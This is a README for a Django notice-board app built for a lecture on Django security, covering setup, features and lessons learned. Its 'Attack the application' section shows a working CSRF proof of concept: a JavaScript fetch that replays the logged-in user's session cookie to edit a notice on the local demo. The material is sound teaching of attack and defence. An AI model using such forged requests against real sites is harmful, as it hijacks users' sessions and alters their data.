# board

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Attack the application](#attack-the-application)
4. [Features](#features)
5. [What have I learned?](#what-have-i-learned)

## Overview

board is a minimalist notice board built using [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML), [Tailwind CSS](https://tailwindcss.com/), [Django](https://www.djangoproject.com/), [MySQL](https://www.mysql.com/) and [Docker](https://www.docker.com/). 

This web application was used to give a lecture on the operation of Django and its security mechanisms. This lecture covers topics such as user authentication, URL protection, Middleware, CORS and CSRF Attack and Defense strategies.

### Demonstration of the application

<video src="https://github.com/antonioalanxs/board/assets/79718376/a3d8ddd6-486b-4007-bb52-db1aba3a1e6f" alt="Demonstration"></video>

## Installation

### Prerequisites

Have [Docker](https://docs.docker.com/engine/install/) installed on your machine.

### Cloning the Repository

```shell
git clone https://github.com/antonioalanxs/board
cd board
```

### Run the application

```shell
cd docker
docker compose up --build
```
The application is now running on your [localhost:8000](http://localhost:8000).

### Sample users

| User               | Username      | Password             |
| :----------------: | :-----------: | :------------------: |
| **@antoniomanuel**         | antoniomanuel         | `a`        |
| **@teresavrod**          | teresavrod          | `a`             |
| **@antonioalanxs** | antonioalanxs | `a` |

### Stop the application

```shell
docker compose down
```

The application was turned off.

## Attack the application

1.  [Run the application](#run-the-application) and log in with an [user](#sample-users). This will cause the browser to save its `sessionid`.
  
2.  Select the `slug` of the notice that you want to edit attacking it. You can do this using [phpMyAdmin](http://localhost:8080) or by looking at the notice URL.

3.  Change current working directory to `attack-server` and Run Attack Server (e.g., `python -m http.server 5000`).

4.  The Attack Server will edit the notice by fetching its URL including the necessary cookies (stored in the browser previously when logging in, `sessionid`) so that the request is not denied.
```javascript
const slug = "3e2e62cf-35f2-4d8e-9244-8649a4748c52" // Example notice slug

fetch(`http://localhost:8000/update/${slug}`, {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "title=attacker&content=attacker"
})
    .then(res => res.text())
    .then(text => console.log(text))
    .catch(err => console.error(err));
```

## Features

### Functional Requeriments

- **Registration**: New users can easily register by providing essential information.
  
- **Login**: Users can log in securely to access their shopping list.
  
- **Skip Login (Auto-Login)**: For returning users, the application provides a convenient option to skip the login process.
  
- **Logout**: Users can log out at any time to secure their account and data.

- **Read a Notice**: Users can view the contents of a notice in a readable format, enabling them to stay informed about important information or updates shared within the application.

- **Publish a Notice**: Users can write a notice in a very simple manner.
  
- **Delete a Notice**: Users can remove notices with a single click.

- **Edit a Notice**: Users have the flexibility to modify their notices, allowing them to update information or make corrections as needed.

### Non-functional Requirements

- **Minimalistic and User-Friendly Interface:** The application boasts a clean and intuitive design, providing an exceptional user experience (UX).

- **Responsive Design**: Ensured optimal viewing and interaction across various devices, enhancing accessibility.

- **Legal Compliance:** The application strictly follows the laws and regulations of each country in which it is used.

- **Scalability:** Built to handle a growing user base and data efficiently.

- **Availability:** Ensures the application is available and accessible to users when needed.

- **Data Durability with SQL Database:** Guarantees the persistence and reliability of user data by leveraging a SQL database, ensuring robust storage and retrieval capabilities.

## What have I learned?

- **Better understanding and management of Docker**: Gained proficiency in handling Docker containers, enhancing the distribution of applications.

- **Usage of phpMyAdmin**: Acquired skills in utilizing phpMyAdmin for MySQL database management, facilitating data visualization and administration.

- **Seeder usage for database initialization**: Learned to use seeders to populate and initialize the database with test data, aiding in development and testing phases.

- **Improved understanding of Django architecture**: Enhanced comprehension of Django's framework architecture for more effective and scalable web application development.

- **Middleware utilization**: Learned how to use middlewares in the context of Django, allowing customization and extension of web application's behavior.

- **Understanding CORS (Cross-Origin Resource Sharing)**: Acquired knowledge about how CORS works and its significance in web development. Learned how to handle and configure CORS to enable secure communication between different origins in the context of web applications.

- **CSRF Attack and Defense Strategies**: Explored the concept of Cross-Site Request Forgery (CSRF) attacks and gained insights into both launching and defending against such attacks. Developed strategies to implement CSRF protection measures in web applications, ensuring the security of user data and interactions.

- **Enhanced communication skills**: Strengthened communication abilities through giving the lecture, enhancing my ability to communicate ideas effectively.

